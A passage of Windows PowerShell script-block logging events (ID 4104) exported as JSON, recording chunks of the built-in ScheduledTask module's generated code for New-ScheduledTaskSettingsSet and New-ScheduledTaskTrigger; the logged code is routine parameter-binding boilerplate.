[object]$__cmdletization_value = ${ExecutionTimeLimit}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExecutionTimeLimit'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExecutionTimeLimit'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MultipleInstances')) {\r\n          [object]$__cmdletization_value = ${MultipleInstances}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MultipleInstances'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.MultipleInstancesEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MultipleInstances'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.MultipleInstancesEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Priority')) {\r\n          [object]$__cmdletization_value = ${Priority}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Priority'; ParameterType = 'System.Int32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Priority'; ParameterType = 'System.Int32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RestartCount')) {\r\n          [object]$__cmdletization_value = ${RestartCount}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RestartCount'; ParameterType = 'System.Int32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RestartCount'; ParameterType = 'System.Int32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RestartInterval')) {\r\n          [object]$__cmdletization_value = ${RestartInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RestartInterval'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RestartInterval'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RunOnlyIfNetworkAvailable')) {\r\n          [object]$__cmdletization_value = ${RunOnlyIfNetworkAvailable}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunOnlyIfNetworkAvailable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunOnlyIfNetworkAvailable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationI",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991312Z"
    },
    "EventRecordID": 33,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 10,
    "MessageTotal": 19,
    "ScriptBlockText": "nfo]::new('NewSettings', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'New-ScheduledTaskSettingsSet' -Alias '*'\r\n        \r\n\r\nfunction New-ScheduledTaskTrigger\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='Once', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Daily', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Daily},\r\n\r\n    [Parameter(ParameterSetName='Daily')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${DaysInterval},\r\n\r\n    [Parameter(ParameterSetName='Daily')]\r\n    [Parameter(ParameterSetName='Logon')]\r\n    [Parameter(ParameterSetName='Once')]\r\n    [Parameter(ParameterSetName='Startup')]\r\n    [Parameter(ParameterSetName='Weekly')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${RandomDelay},\r\n\r\n    [Parameter(ParameterSetName='Daily', Mandatory=$true)]\r\n    [Parameter(ParameterSetName='Once', Mandatory=$true)]\r\n    [Parameter(ParameterSetName='Weekly', Mandatory=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [datetime]\r\n    ${At},\r\n\r\n    [Parameter(ParameterSetName='Logon', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${AtLogOn},\r\n\r\n    [Parameter(ParameterSetName='Logon')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${User},\r\n\r\n    [Parameter(ParameterSetName='Once', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Once},\r\n\r\n    [Parameter(ParameterSetName='Once')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${RepetitionDuration},\r\n\r\n    [Parameter(ParameterSetName='Once')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${RepetitionInterval},\r\n\r\n    [Parameter(ParameterSetName='Startup', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${AtStartup},\r\n\r\n    [Parameter(ParameterSetName='Weekly')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [System.DayOfWeek[]]\r\n    ${DaysOfWeek},\r\n\r\n    [Parameter(ParameterSetName='Weekly', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Weekly},\r\n\r\n    [Parameter(ParameterSetName='Weekly')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [uint32]\r\n    ${WeeksInterval},\r\n\r\n    [Parameter(ParameterSetName='Daily')]\r\n    [Parameter(ParameterSetName='Logon')]\r\n    [Parameter(ParameterSetName='Once')]\r\n    [Parameter(ParameterSetName='Startup')]\r\n    [Parameter(ParameterSetName='Weekly')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Daily')]\r\n    [Parameter(ParameterSetName='Logon')]\r\n    [Parameter(ParameterSetName='Once')]\r\n    [Parameter(ParameterSetName='Startup')]\r\n    [Parameter(ParameterSetName='Weekly')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Daily')]\r\n    [Parameter(ParameterSetName='Logon')]\r\n    [Parameter(ParameterSetName='Once')]\r\n    [Parameter(ParameterSetName='Startup')]\r\n    [Parameter(ParameterSetName='Weekly')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Daily') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Daily')) {\r\n          [object]$__cmdletization_value = ${Daily}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Daily'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Daily'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DaysInterval')) {\r\n          [object]$__cmdletization_value = ${DaysInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DaysInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DaysInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RandomDelay')) {\r\n          [object]$__cmdletization_value = ${RandomDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('At')) {\r\n          [object]$__cmdletization_value = ${At}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'At'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'At'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewTriggerByDaily', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Logon') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RandomDelay')) {\r\n          [object]$__cmdletization_value = ${RandomDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991322Z"
    },
    "EventRecordID": 34,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 11,
    "MessageTotal": 19,
    "ScriptBlockText": "__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AtLogOn')) {\r\n          [object]$__cmdletization_value = ${AtLogOn}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AtLogOn'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AtLogOn'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('User')) {\r\n          [object]$__cmdletization_value = ${User}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewTriggerByLogon', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Once') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RandomDelay')) {\r\n          [object]$__cmdletization_value = ${RandomDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('At')) {\r\n          [object]$__cmdletization_value = ${At}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'At'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'At'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Once')) {\r\n          [object]$__cmdletization_value = ${Once}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Once'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Once'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RepetitionDuration')) {\r\n          [object]$__cmdletization_value = ${RepetitionDuration}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RepetitionDuration'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RepetitionDuration'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RepetitionInterval')) {\r\n          [object]$__cmdletization_value = ${RepetitionInterval}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RepetitionInterval'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RepetitionInterval'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewTriggerByOnce', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Startup') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RandomDelay')) {\r\n          [object]$__cmdletization_value = ${RandomDelay}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomDelay'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AtStartup')) {\r\n          [object]$__cmdletization_value = ${AtStartup}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AtStartup'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AtStartup'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 